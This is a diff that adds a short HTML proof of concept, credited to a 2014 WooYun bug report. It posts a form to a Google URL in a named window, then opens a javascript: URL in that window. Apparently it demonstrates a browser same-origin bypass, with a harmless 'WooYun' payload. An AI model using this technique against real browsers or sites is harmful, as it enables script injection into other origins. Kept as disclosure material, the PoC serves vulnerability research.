@@ -1,0 +1,12 @@
+via http://www.wooyun.org/bugs/wooyun-2014-066355
+<form action="https://www.google.com/csi" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c">
+<input type="submit">Submit</input>
+</form>
+
+<script>
+function d(){
+
+	var k = window.open("javascript:document.write('WooYun')", "xx");
+
+}
+</script>
